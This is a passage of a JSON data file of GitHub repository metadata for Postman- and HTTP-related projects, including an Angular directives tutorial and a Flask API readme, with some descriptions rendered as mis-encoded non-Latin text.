    "description": "Game Store - simple project on popular stack :Spring, h2, lombok, Jpa. –î–∞–Ω–Ω—ã–π –ø—Ä–æ–µ–∫—Ç –∏—Å–ø–æ–ª—å–∑—É–µ—Ç in memory db, —Ç–∞–∫ —á—Ç–æ –µ–≥–æ –º–æ–∂–µ—Ç–µ –∑–∞–ø—É—Å—Ç–∏—Ç—å –±–µ–∑ –¥–∞–º–ø–∞ –±–¥. –ó–∞–ø—Ä–æ—Å—ã –ø–æ–∫–∞ —á–µ—Ä–µ–∑ postman, –ø—Ä–∏–º–µ—Ä—ã –≤ –∫–æ–º–º–µ–Ω—Ç–∞—Ä–∏—è—Ö –∫–æ–¥–∞. –ü–æ http://localhost:8080/h2/ –º–æ–∂–µ—Ç–µ –ø–æ—Ä–∞–±–æ—Ç–∞—Ç—å —Å –±–¥ —á–µ—Ä–µ–∑ –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å. –î–ª—è –∑–∞—Ö–æ–¥–∞ jdbcUrl -> jdbc:h2:mem:testdb . –î–∞–ª–µ–µ –æ.–∫ (—é–∑–µ—Ä –ø–æ —É–º–æ–ª—á–∞–Ω–∏—é sa, –±–µ–∑ –ø–∞—Ä–æ–ª—è)",
    "fork": false,
    "created_at": "2020-03-20T19:18:14Z",
    "updated_at": "2020-03-20T19:38:04Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 43555018,
    "owner_login": "InLove4Coding",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/43555018?v=4",
    "pulled": 1,
    "tags": [
      "test",
      " postman",
      "http",
      "local",
      "host",
      "stack",
      "popular",
      "memory",
      "in memory",
      "jdbc",
      "lombok"
    ]
  },
  {
    "id": 204454516,
    "name": "inventory_management",
    "full_name": "axel-n/inventory_management",
    "description": null,
    "fork": false,
    "created_at": "2019-08-26T10:44:33Z",
    "updated_at": "2019-09-09T12:53:22Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 6695246,
    "owner_login": "axel-n",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/6695246?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 142746863,
    "name": "My_first_cryptocurrency",
    "full_name": "HP213/My_first_cryptocurrency",
    "description": "Using Blockchain, I made my first cryptocurrency, I suggest using postman for better understanding. Baiscally we made an decentralized system of transferring cryptocurrency. It is runnig locally on http://127.0.0.1:5001/ you can chage port according to requirement and new user. Post request is made to add transactions and create a new node and get request to block new mine and get chain. Everything mentioned in code with comments, we have made three ports http://127.0.0.1:5002/, http://127.0.0.1:5003/, http://127.0.0.1:5004/, to show connections between three miners \"A\" \"B\" and \"C\". You can make more  ",
    "fork": false,
    "created_at": "2018-07-29T09:17:12Z",
    "updated_at": "2018-07-29T09:18:44Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 34127674,
    "owner_login": "HP213",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/34127674?v=4",
    "pulled": 1,
    "tags": [
      " postman",
      "create",
      "request",
      "call",
      "node",
      "http",
      "user",
      "code",
      "local",
      "more",
      "connect",
      "very",
      "system",
      "action",
      "chai",
      "currency",
      "between",
      "under",
      "crypto",
      "require",
      "connection",
      "according",
      "locally",
      "comments",
      "mine",
      "three",
      "better",
      "transactions",
      "understanding",
      "cryptocurrency",
      "suggest"
    ]
  },
  {
    "id": 217643420,
    "name": "express_http_RequestAndResponse_CheckingAgainstArray-",
    "full_name": "DJMare/express_http_RequestAndResponse_CheckingAgainstArray-",
    "description": "A simple express http request and response app using req.query to check against an array and view in Postman. ",
    "fork": false,
    "created_at": "2019-10-26T02:12:41Z",
    "updated_at": "2019-12-03T04:38:58Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 35668707,
    "owner_login": "DJMare",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/35668707?v=4",
    "pulled": 1,
    "tags": [
      "request",
      "http",
      "express",
      " express",
      "response",
      "view",
      "check",
      "query",
      "array"
    ]
  },
  {
    "id": 40326550,
    "name": "Angular-Directive-Project",
    "full_name": "sn0112358/Angular-Directive-Project",
    "description": "Angular-Directive-Project Directives range from very basic to extremely complex. This project will build up to some somewhat difficult directives. Keep in mind that the format we're learning for directives is the same format used to build some extremely complex things in angular. Using directives often and well is one way to show you're a talented developer.  Starting Out  We've included only a few things for you to begin with. index.html, app.js, styles.css. At this point the best way to get more comfortable with angular is to initialize an app without relying heavily on boilerplate code (reusable code that starts out your projects for you).  You'll notice that in the index.html we've included the angular-route CDN. Yes, we'll be using angular's router here. Put an ng-view into your index.html.  In your app.js set up a config and set up our first route for when a user is at the '/home' url. If you're having trouble remembering how to set up the router go look at how you set up the router on the previous project. One way these projects will be beneficial to you is allowing you to look back at something *you** did and seeing how you got that something to work.* You may also want add an otherwise that defaults to /home. Create a controller and a template file for this route in your app folder. Don't forget to include the controller as a script in your index.html Check that everything is hooked up correctly. Try adding a div with some text in your home template just to make sure it's showing up. Once you've got that going you're ready to start on some directives. Now let's make our directive. We'll start with a simple one that we can use to display information passed to it.  Step 1. Start your directive  Woot. When you're initializing your directive just remember that it works very similarly to how you start up a controller or a service. It can also be very helpful to think of your directive as a route.  Create your directive. You'll use the directive method on your angular module. It takes two arguments, the name string and the callback function, which will return the object that represents your directive. When naming your directive give it a name with two words; dirDisplay would be nice, but anything works. Just remember it's best practice to give a directive a camel case name so that it's clear in your html what it is. Also we're going to need a template html for our directive. We could do it inline, but let's make another file instead. Just name it something that makes sense for the name of your directive and put it in the same directory as your directive file. For your template just make a  and inside a  tag that says User. Now in your home route html add in your directive. It will look like this if you named it dirDisplay:  Start up your app and go to the home route. Check and make sure you see User where your directive was placed. If you're not seeing it at this point it could mean a few things. Here's some more common issues. You didn't link your directive in your index as a script. Your name for your directive doesn't match the name in your html. Remember camel case becomes snake case so myDirective becomes . You're file path to your html template is wrong. You have to think of file paths in angular as relative to the index. Here's some code to see just for this part, and just for the directive's js file.  var app = angular.module('directivePractice'); app.directive('dirDisplay', function(){   return {     templateUrl: 'app/directives/dirDisplay.html'   }; }); What we're returning is the directive object. You won't see anymore code in this tutorial so it's important you get things working right and refer back to what you've already done to advance from now on.  Step 2. Advancing directives  Your directive should be loaded up now, but it's not really doing much. Let's make it better.  In your home controller. Make a variable on your $scope called user. Set it's value to {   name: \"Geoff McMammy\",   age: 43,   email: \"geofdude@gmail.com\" } Now inside your directive's html specifically inside the  tags display our new user's name. Then inside maybe some  tags display his email and age. This is going to work exactly the same as if it was just inside your home controller. Reload the page and make sure it works. This is still very cosmetic and really not all that useful. It needs functionality.  Add into your directive's object the link property. The link property's value is a function definition that takes (generally) three parameters. scope, element, and attributes. Unlike in other places with angular injection these parameter names don't carry meaning. The first parameter will always represent your $scope for that directive, the second will always be the element that wraps your whole directive, and the third will always be an object containing all the properties and values of the attributes on your directive in the dom. Try the following to get a feel for all three.  Add two attributes to your directive in your html. Like this -  Now in the link property you've added console.log the three parameters in the function. You'll see an object for scope that should look identical to the $scope of your html function. For element you'll see an object the represents the DOM wrapper for your directive. For attributes you'll see an object that will look like this:  {   test: \"myTest\",   myCheck: \"checkItOut\" } An important thing to notice is how it has again converted snake case to camel case for you. my-check became myCheck. Don't forget this. You'll run into this issue one day. It counts for both attributes and directive names.  To feel some of what the link function could do let's try this.  Add a ng-show to both the email and age wrappers. This should be familiar to you. Now inside your link function add a click event listener to your element property. It's going to look just like jQuery. element.on('click', function(){  }) Inside the click listener's callback add a toggle for the ng-show property you passed in. Along with a console.log to make sure things are connecting when you click. Try it out. Don't call for a mentor when it doesn't work. Let's talk about that first. You should see the console.log firing, but why isn't it toggling. This is going to be a common problem when working with the link function and event listeners. What we have here is an angular digest problem. The value is changing on the scope object, but the change isn't being reflected by our DOM. That's because angular isn't aware of the change yet. Anytime we cause an event to happen using something like jQuery or even angular's jQLite we need to let angular know that we've made a change.  Add this line of code in place of your console.log, scope.$apply(). Now try it out. It should be working now, so if you're still having issues it's time to debug. What we've done is forced angular to run it's digest cycle. This is where angular checks the scope object for changes and then applies those to the DOM. This is another good lesson to learn for later. You'll most likely hit this when making changes to your element using event listeners.  Step 3. Directive's re-usability.  Now our directive has some extremely basic functionality. One of a directive's greatest advantages though is its ability to be placed anywhere and still be functional. Let's say instead we had a list of users instead of just one.  Change the $scope property in your home controller to be users and give it this array as its value: [  {    name: \"Geoff McMammy\",    age: 43,    email: \"geofdude@gmail.com\",    city: \"Provo\"  },  {    name: \"Frederick Deeder\",    age: 26,    email: \"fredeed@gmail.com\",    city: \"Austin\"  },  {    name: \"Spencer Rentz\",    age: 35,    email: \"spencerrentz@gmail.com\",    city: \"Sacramento\"  },  {    name: \"Geddup Ngo\",    age: 43,    email: \"geddupngo@gmail.com\",    city: \"Orlando\"  },  {    name: \"Donst Opbie Leevin\",    age: 67,    email: \"gernee@gmail.com\",    city: \"Phoenix\"  } ] Now in your home HTML add a ng-repeat to the directive call. Tell it to repeat for each user in users. Reload your page. It's working! But why? How does each directive instance know what information to display?  In the link function console.log the scope parameter. Make sure it's outside of your click listener. You'll see five print outs in your console. Open up any one of them and look to the bottom. Open up the user property. It's exactly what we would want! But again why would that be the case? Don't get too caught up in this next bit if it's too hard to understand, but the ng-repeat is essentially making new tiny scope objects for each individual user in our users array. Now each of our directives is still getting a user property on the scope object just like the directive wanted in the beginning. Woot.  Step 4. Ramp it up with Isolate Scope.  Directives can do so much more. So let's make that happen. That means we should make.... a new directive!!! This directive's purpose will be to display a selected User and the weather in his/her/its location. Link it up just like the last one.  Create a js file for our directive and name it dirWeather. Make an html file named dirWeather.html. Link it up in your index.html and add the template to your new directive object. In your directive's template give it an  tag that says Weather just so we can know it's working. Above your ng-repeat on dirDisplay add your new dirWeather directive. If it's not working check the instructions above as to some common reasons why before asking a mentor for help. If you're seeing the Weather text on your page then we're ready to try out the dreaded Isolate Scope. The isolate scope object is one of the stranger API's in angular. I'm sorry but it is. Just refer to this for now.  scope: {  string: '@',  link: '=',  func: '&' } The properties on the scope object represent the attributes on the directive in the html. Our example scope object here would look something like this in the html.  The hard part here is the @, =, and &. They each have very important and distinct meanings.  @ says take in my attribute value as a string. = says take in my attribute value as a two-way bound variable from the parent scope. & says take in my attribute value as a reference to a function on the parent scope. It's also critical to point out that once you add a scope object you have no isolated your directive's scope. Meaning, aside from the values passed in through attributes, this directive has no connection to the $scope of its parent.  That being said let's isolate our directive's scope. :worried:  Add the scope property to your dirWeather. Give it the value of an object with a property of currentUser whose value is '='. Remember in your html this will look like current-user. This is the third time I've said so don't expect it again. This means that whatever comes into the currentUser attribute is going to be a value of the parent's scope object.  For now test this out by passing in users[0]. Find a way to show that users information inside your dirWeather's html. Remember inside your directive now the user is represented by currentUser. Step 5. &? &!?  The '=' value on your scope object has created a two-way binding between users[0] and currentUser. Now let's try out the '&'.  On your home controller add a function called getWeather. It takes one parameter called city. This function will make a call to a service so we'll need to create that. Make a weather service. Name it something cool and creative like weatherService. Inside the weather service make a function called getWeather that also takes one parameter, city. Make an $http get to this url - 'http://api.openweathermap.org/data/2.5/weather?q=' After the q= add on the city parameter. If you want you can test this out in postman. See what kind of data you get back. If it's the weather of that city then... you win! Use $q to return a promise that only resolves with the data you want. Temperature (preferably not in Kelvin) and the weather description. Use console.log on the data coming from the $http request to get to what you want. You'll need to add both on an object that you resolve your new promise with. On your home controller have it return the result of invoking the get getWeather function on the service. You should be returning a promise. Now in your home route's HTML pass in the getWeather function to the dirWeather directive through an attribute called weather-call. Add the attribute to your isolate scope object. That was a lot of linking, but let's walk through it. Your controller has a function linked to the service, which is in turn linked to your directive. So if you run the weatherCall function in your directive it will go through your controller to your service and then back.  Now things get a little bit tricky. Angular's way of passing along arguments through a directive to your controller are tricky, but once you understand how to do it, it's not hard. I'm going to give an example here of how it works.   Here's how it would look in your HTML. But where's the data supposed to be coming from? It seems that you'd rather be able to pass in data from your directive. Well you still can, you just have to essentially tell angular what do use as an argument to replace data when it calls that function in your controller. The actualy function call inside the directive will look like this.  $scope.passFunc({data: wantedData}) So what you'll do is pass in an object where the property name is what the argument is named in the HTML where you call the directive. That might sound confusing, but just look at the two code blocks above for a pattern. Note that pass-func becomes $scope.passFunc and data is being replaced with wantedData with the {data: wantedData} object. In our directive we want to replace city in the attribute call, for something else inside the directive. You'll follow the same pattern as above.  For now let's get things set up for that function call.  Add to the dirWeather directive object a property called controller. It's value will be a function. Yes, this is a controller specifically for your one directive. It works the same as any other controller, except you don't give it a name. It's $scope object will only be accessible within an instance of your directive. Don't forget to inject $scope in the function.  Inside your controller function run the weatherCall function with the city property from the currentUser on your $scope. Here's where you need to make sure you've passed in a city argument in the attribute function call, and then replace that with your currentUser's city using an object with a city property. The function call should return a promise, so call .then afterward and add the data onto your $scope to display both the weather and temperature of the currentUser's city. The properties can be named whatever makes sense to you.  You may also want to find a way to get rid of all the decimal places on your temperature. Now you should have everything hooked up so it shows Geoff's data and the weather data for Provo. But is that good enough?  Step 6. Ramping up our ramp up.  Now let's change this so it shows the weather data for whichever user we select. We're going to need to use '&' again.  Make a function on the home controller that takes in a parameter and sets a property on the $scope to be that parameter. Maybe you see where this is going.  We want to get this function into our dirDisplay controller. But in order to do that we need to isolate dirDisplay's scope. This also means we need to pass in each individual user through the scope object as well.  To make it easier on ourselves, let's pass the current user from our ng-repeat into our directive through a user attribute. This way we can leave our two-way bindings as they are. Also pass our new function that sets our current user from our home controller into our directive through a setUser attribute.  You'll need to add an argument in there again. Go with user. Your scope object in dirDisplay should have two properties. setUser with the value of '&' and user with the value of '='. As before we're going to need to do some tricky stuff to get our argument back to our controller.  Call the setUser function inside our click event listener and pass in an object the sets our user argument to be the user on our directive's scope object. If you've forgotten this part go back up and take a look at how you did it before or the example in this README.  Whatever user you click on now should show up in the dirWeather directive as the current user. But we're missing one thing, we want to be able to see the weather for that user too. We'll have to do one more thing that will seem a little bit tricky at first, but it's good to learn if you don't know it already since it's actually used quite frequently.  We need to step up a change listener on our currentUser in the dirWeather directive. We'll use angular's $watch functionality. $watch is a method on your $scope that will watch for changes in a variable you give it. It works in two ways.  $scope.$watch('property', function(value){  console.log(\"When $scope.property changes its new value is: \", value) }); And  $scope.$watch(function(){  return myVar }, function(value){  console.log(\"When myVar changes its new value is: \", value); }); Remove the immediate function call that we have in there now. Maybe just comment it out for now because we'll use it in a bit. Now call the $watch method on your scope and have it watch currentUser. Either way of using $watch is fine. Have its callback run the $scope.weatherCall function just like you had it before.  One thing to note is that $scope.$watch will always run once to begin with. Since that's what we want here it's great, but just be aware of that.  If you've reached this point congratulate yourself. You've messed with some serious stuff today, namely directives. There are still a lot of things about directives that we can't possibly cover in a single project. If you like what we've done so far then you're in a good place to keep going. A developer who understands directives well can build a really clean looking code base. Just look at your home.html. It could have just two lines in it. If you're feeling good move on now to Step 7.  Step 7. Finishing touches  Try to work out these problems on your own.  There should be a way to let the user know that the weather data is loading. Something that appears while our $http request is retrieving our data. The $http request shouldn't fire on both opening and closing a user's information. A color change for the currently active user would be nicer than showing that user's info inside the dirWeather modal. Or at least less redundant. Whatever else you want. We still haven't explored transclusion and ng-transclude so give that a try if you're feeling adventurous. Just know that it's a way for deciding where to put the HTML child elements of a directive. It's cool stuff that can involve some criss-crossing of scopes.",
    "fork": false,
    "created_at": "2015-08-06T20:56:18Z",
    "updated_at": "2019-03-11T21:13:13Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 14,
    "watchers": 0,
    "score": 1,
    "owner_id": 13667207,
    "owner_login": "sn0112358",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/13667207?v=4",
    "pulled": 1,
    "tags": [
      "test",
      " postman",
      "create",
      "data",
      "request",
      "form",
      "file",
      "script",
      "service",
      "call",
      "http",
      "user",
      "develop",
      "code",
      "example",
      "contain",
      "format",
      "convert",
      "mail",
      "line",
      "help",
      "route",
      "build",
      "function",
      "load",
      "calls",
      "spec",
      "list",
      "star",
      "read",
      "import",
      "users",
      "learn",
      "rent",
      "more",
      "plate",
      "view",
      "config",
      "start",
      "connect",
      "email",
      "very",
      "functional",
      "method",
      "struct",
      "info",
      "developer",
      "play",
      "need",
      "access",
      "name",
      "working",
      "html",
      "converte",
      "learning",
      "module",
      "check",
      "side",
      "tutorial",
      "infor",
      "long",
      "open",
      "object",
      "print",
      "ever",
      "information",
      "template",
      "case",
      "result",
      "control",
      "esse",
      "text",
      "problem",
      "practice",
      "making",
      "to do",
      "place",
      "between",
      "link",
      "under",
      "right",
      "specific",
      "showing",
      "along",
      "variable",
      "included",
      "lines",
      "getting",
      "desc",
      "within",
      "folder",
      "functionality",
      "order",
      "advance",
      "parameter",
      "following",
      "controller",
      "reference",
      "those",
      "done",
      "ready",
      "debug",
      "needs",
      "find",
      "objects",
      "repl",
      "style",
      "console",
      "useful",
      "note",
      "angular",
      "containing",
      "current",
      "should",
      "single",
      "location",
      "easier",
      "connection",
      "sets",
      "default",
      "common",
      "event",
      "connecting",
      "description",
      "display",
      "both",
      "router",
      "best",
      "words",
      "directory",
      "usable",
      "projects",
      "things",
      "another",
      "complex",
      "added",
      "being",
      "third",
      "select",
      "fire",
      "wrapper",
      "doing",
      "correct",
      "path",
      "cause",
      "while",
      "media",
      "going",
      "keep",
      "replace",
      "stuff",
      "home",
      "boiler",
      "expect",
      "issue",
      "still",
      "having",
      "instead",
      "boilerplate",
      "three",
      "definition",
      "currently",
      "adding",
      "better",
      "helpful",
      "talk",
      "little",
      "match",
      "lesson",
      "ember",
      "makes",
      "instruction",
      "previous",
      "city",
      "named",
      "general",
      "instance",
      "familiar",
      "important",
      "become",
      "forge",
      "explore",
      "mean",
      "inside",
      "properties",
      "onto",
      "passing",
      "listen",
      "weather",
      "something",
      "names",
      "reusable",
      "inject",
      "array",
      "least",
      "shows",
      "comfortable",
      "tiny",
      "always",
      "clean",
      "cool",
      "five",
      "namely",
      "invoking",
      "initial",
      "returning",
      "actually",
      "wrappers",
      "wraps",
      "talent",
      "whole",
      "element",
      "directives",
      "elements",
      "essential",
      "sense",
      "arent",
      "much",
      "every",
      "wanted"
    ]
  },
  {
    "id": 204020403,
    "name": "gostman",
    "full_name": "ssebs/gostman",
    "description": "golang POSTman (http client)",
    "fork": false,
    "created_at": "2019-08-23T15:02:30Z",
    "updated_at": "2019-08-28T14:53:07Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 8152823,
    "owner_login": "ssebs",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/8152823?v=4",
    "pulled": 1,
    "tags": [
      "client",
      "http",
      "lang",
      "golang"
    ]
  },
  {
    "id": 112044930,
    "name": "java-http-postman",
    "full_name": "x0st/java-http-postman",
    "description": "One more http client in Java.",
    "fork": false,
    "created_at": "2017-11-26T00:40:17Z",
    "updated_at": "2019-02-23T17:49:47Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 17602927,
    "owner_login": "x0st",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/17602927?v=4",
    "pulled": 1,
    "tags": [
      "client",
      "http",
      "more"
    ]
  },
  {
    "id": 197391693,
    "name": "gerenciador-viagens",
    "full_name": "olvfg/gerenciador-viagens",
    "description": "https://medium.com/assertqualityassurance/como-construir-e-testar-uma-api-em-java-utilizando-o-postman-baae69d8b8aa",
    "fork": false,
    "created_at": "2019-07-17T13:07:46Z",
    "updated_at": "2019-07-17T13:10:54Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 39816180,
    "owner_login": "olvfg",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/39816180?v=4",
    "pulled": 1,
    "tags": [
      "test",
      "http",
      "https",
      "util",
      "star",
      "java",
      "utilizando",
      "assert",
      "quality",
      "como",
      "construir",
      "assurance"
    ]
  },
  {
    "id": 153759693,
    "name": "stategen",
    "full_name": "stategen/stategen",
    "description": "ÈÄöÁî®springMvc/springBootÂàÜÂ∏ÉÂºèÈùûÂº∫Ëø´ÊÄßÂÖ®Ê†àÊû∂ÊûÑ(javaÊúçÂä°Á´ØÔºåH5„ÄÅiOS„ÄÅandriodÂâçÁ´Ø)ÔºåÂÜÖÂê´Â§ßÂêçÈºéÈºéÁöÑÊîØ‰ªòÂÆùdalgen‰πãfreemarkerÂºÄÊ∫êÂÆûÁé∞‰πãÂïÜÁî®ÂçáÁ∫ßÁâàdalgenXÔºåÊòØÂîØ‰∏ÄÊîØÊåÅËø≠‰ª£ÂºÄÂèëÁöÑÂÖ®Ê†à‰ª£Á†ÅÁîüÊàêÂô®ÔºåÂ§ßÈáèÂâç„ÄÅÂêéÁ´Ø‰ª£Á†ÅÈÄöËøáÁîüÊàêÂô®ÁîüÊàêÔºåÂÖ∂‰∏≠ÂêéÁ´Ø‰ªªÊÑèapiÁõ¥Êé•ÁîüÊàêÂâçÁ´ØÁΩëÁªúË∞ÉÁî®„ÄÅÁä∂ÊÄÅÂåñ„ÄÅ‰∫§‰∫íÁ≠âÁõ∏ÂÖ≥‰ª£Á†ÅÔºåÊääÂâçÂêéÁ´ØÂàÜÁ¶ªÂºÄÂèë\"Êãâ\"ÂõûÊù•ÔºåÁõÆÂâçÂâçÁ´ØÂ∑≤ÊîØÊåÅreact(dva+umi+typescript)Âíåflutter(provider),ÂêéÁª≠Âä†ÂÖ•kotlin„ÄÅswf„ÄÇÂÖçÂéªÂâçÁ´ØÊñáÊ°£„ÄÅË∞ÉËØï„ÄÅpostman„ÄÅmockjs...ÁπÅÁêê„ÄÇÂºÄÂèë‰∏≠Ëø≠‰ª£ÁîüÊàêÔºå‰∏çÊîπÂèòÂéüÂºÄÂèëÊµÅÁ®ã„ÄÅÁîüÊàê80%‰ª£Á†Å,ÂÖºÂÆπÂêé20%‰Ω†Ëá™Â∑±ÁöÑ‰ª£Á†ÅÔºåÊãíÁªùÊåñÂùëÔºÅ  https://github.com/stategen/stategen",
    "fork": false,
    "created_at": "2018-10-19T09:34:49Z",
    "updated_at": "2020-03-14T08:04:49Z",
    "stargazers_count": 44,
    "watchers_count": 44,
    "forks": 10,
    "watchers": 44,
    "score": 1,
    "owner_id": 44145320,
    "owner_login": "stategen",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/44145320?v=4",
    "pulled": 1,
    "tags": [
      "script",
      "http",
      "https",
      "java",
      "stat",
      "mock",
      "spring",
      "provide",
      "github",
      "react",
      "type",
      "types",
      "free",
      "typescript",
      "provider",
      "freemarker",
      "flutter"
    ]
  },
  {
    "id": 212098564,
    "name": "BPS-BaseDevelopment_1_2019",
    "full_name": "BestPracticeSchool/BPS-BaseDevelopment_1_2019",
    "description": "Course: \"Base of Development\" by BestPractice School https://bestpracs.ru/",
    "fork": false,
    "created_at": "2019-10-01T13:08:00Z",
    "updated_at": "2019-12-11T13:26:59Z",
    "stargazers_count": 3,
    "watchers_count": 3,
    "forks": 1,
    "watchers": 3,
    "score": 1,
    "owner_id": 54501380,
    "owner_login": "BestPracticeSchool",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/54501380?v=4",
    "pulled": 1,
    "tags": [
      "http",
      "https",
      "best"
    ]
  },
  {
    "id": 188559312,
    "name": "IreporterReactJs",
    "full_name": "LarryKarani/IreporterReactJs",
    "description": "# iReporterApi iReporter is an application whose aim is to reduce corruption in Africa and foster economic development. It allows users to create red flags and interventions. It implents the following list of APIs.  ### Framework used The application is built using python: flask framework. >[Flask](http://flask.pocoo.org/) is a microframework for the Python programming language.   ### End points Method | Endpoint | Usage | | ---- | ---- | --------------- | |POST| `/api/v2/auth/signup` |  Register a user. | |POST| `api/v2/auth/login` | Login user.| |POST| `api/v2/auth/logout` | Logs out a user.| |POST| `api/v2/interventions` | Create a new incident. | |GET| `api/v2/interventions` | Get all the created incidents. | |GET| `api/v2/interventions/user` | Get all incident of the logged in user. | |GET| `api/v2/interventions/` | Get a single incident. | |PATCH| `api/v2/interventions//location` | Update a single incident location. | |PATCH| `api/v2/interventions//comment` | Update a single incident comment. | |PATCH| `api/v2/interventions//status` | Update a single incident status. | |DELETE| `api/v2/interventions/` | Delete a single incident. |  ## Installation üïµ - To run on local machine git clone this project : ``` $ git clone https://github.com/larryTheGeek/iReporterApi.git ``` Copy and paste the above command in your terminal, the project will be downloaded to your local machine.  To Install python checkout: ``` https://www.python.org/ ```  - create a virtualenv and make it use python 3 using the following command. ``` $ virtualenv -p python3 env ``` - activate the virtual environment ```  $ source env/bin/activate ``` - Install Requirements ``` $ pip install -r requirements.txt ``` ### Testing - Run Test using pytest with the following command ``` $ py.test --cov=app test`  ``` you will get the test coverage report on your terminal   The app can also be tested via Postman - Run App  ``` $ python run.py ``` The app should be accessiable via : http://127.0.0.1:5000/  open postman and navigate to the API endpoints described above  ### HEROKU URL  https://ireporter-version2.herokuapp.com/api/v2/   ### Owner - Larry Karani  ### Motivation https://www.youtube.com/watch?v=wHRUDL7GKmI",
    "fork": false,
    "created_at": "2019-05-25T11:43:18Z",
    "updated_at": "2019-05-28T07:00:53Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 22986772,
    "owner_login": "LarryKarani",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/22986772?v=4",
    "pulled": 1,
    "tags": [
      "test",
      " postman",
      "create",
      "repo",
      "application",
      "http",
      "user",
      "develop",
      "sign",
      "environment",
      "auth",
      "endpoint",
      "points",
      "tested",
      "framework",
      "https",
      "endpoints",
      "load",
      "local",
      "list",
      "source",
      "built",
      "users",
      "stat",
      "version",
      "python",
      "development",
      "command",
      "access",
      "check",
      "program",
      "report",
      "github",
      "allows",
      "open",
      "lang",
      "micro",
      "install",
      "flask",
      "login",
      "clone",
      "desc",
      "download",
      "status",
      "require",
      "following",
      "machine",
      "reporter",
      "should",
      "single",
      "location",
      "terminal",
      "heroku",
      "language",
      "coverage",
      "signup",
      "programming",
      "pytest",
      "foster",
      "youtube",
      "ireporter"
    ]
  },
  {
    "id": 243778877,
    "name": "API-Testing",
    "full_name": "vagabond1-1983/API-Testing",
    "description": "APIÊµãËØïÔºöpostmanÔºåjmeterÔºåyapiÔºåhttprunnerÔºåËá™Á†îÊé•Âè£Ê°ÜÊû∂Ôºåci",
    "fork": false,
    "created_at": "2020-02-28T14:18:03Z",
    "updated_at": "2020-03-15T07:05:06Z",
    "stargazers_count": 1,
    "watchers_count": 1,
    "forks": 1,
    "watchers": 1,
    "score": 1,
    "owner_id": 1966553,
    "owner_login": "vagabond1-1983",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/1966553?v=4",
    "pulled": 1,
    "tags": [
      "http",
      "runner",
      "jmeter",
      "httprunner"
    ]
  },
  {
    "id": 156241766,
    "name": "elasticsearch--",
    "full_name": "worldisnoposition/elasticsearch--",
    "description": "elasticsearchÁöÑhttpÂΩ¢ÂºèÁöÑËØ≠Âè•Ôºå‰ª•postmanÊñá‰ª∂ÂΩ¢ÂºèÂ≠òÂÇ®ÁöÑ",
    "fork": false,
    "created_at": "2018-11-05T15:43:02Z",
    "updated_at": "2018-11-14T14:07:08Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 30585526,
    "owner_login": "worldisnoposition",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/30585526?v=4",
    "pulled": 1,
    "tags": [
      "http",
      "search",
      "elastic",
      "elasticsearch"
    ]
  },
  {
    "id": 141856588,
    "name": "config-repo",
    "full_name": "xuyongcai/config-repo",
    "description": "ÂæÆÊúçÂä°È°πÁõÆÈÖçÁΩÆ‰∏≠ÂøÉÔºåÂØπÂ∫îspringboot2.0ÔºåpostmanÂèØ‰ª•ËÆøÈóÆactuator/bus-refreshÔºåwebhooks‰∏çË°åÔºåÂèØ‰ª•Â∞ùËØï‰∏ãÁªôconfigÈÖçÁΩÆ‰∏≠ÂøÉÂÜô‰∏Ä‰∏™ÊñπÊ≥ïÔºåÁî®httpÂÆ¢Êà∑Á´ØË∞ÉÁî®",
    "fork": false,
    "created_at": "2018-07-22T01:18:29Z",
    "updated_at": "2019-05-24T08:10:29Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 25152440,
    "owner_login": "xuyongcai",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/25152440?v=4",
    "pulled": 1,
    "tags": [
      "http",
      "boot",
      "config",
      "spring",
      "springboot",
      "webhook",
      "webhooks"
    ]
  },
  {
    "id": 227624652,
    "name": "fx-dev-tools",
    "full_name": "jinfanx/fx-dev-tools",
    "description": "simple http client, like postman, but only main functions",
    "fork": false,
    "created_at": "2019-12-12T14:23:56Z",
    "updated_at": "2020-01-22T08:23:43Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 33615730,
    "owner_login": "jinfanx",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/33615730?v=4",
    "pulled": 1,
    "tags": [
      " postman",
      "client",
      "http",
      "function",
      "main",
      "functions"
    ]
  },
  {
    "id": 136303478,
    "name": "server-upload-download",
    "full_name": "romanshutsman/server-upload-download",
    "description": "You can test it in POSTMAN or download client for this app https://git.io/vhaiL !",
    "fork": false,
    "created_at": "2018-06-06T09:13:11Z",
    "updated_at": "2018-07-02T11:25:37Z",
    "stargazers_count": 0,
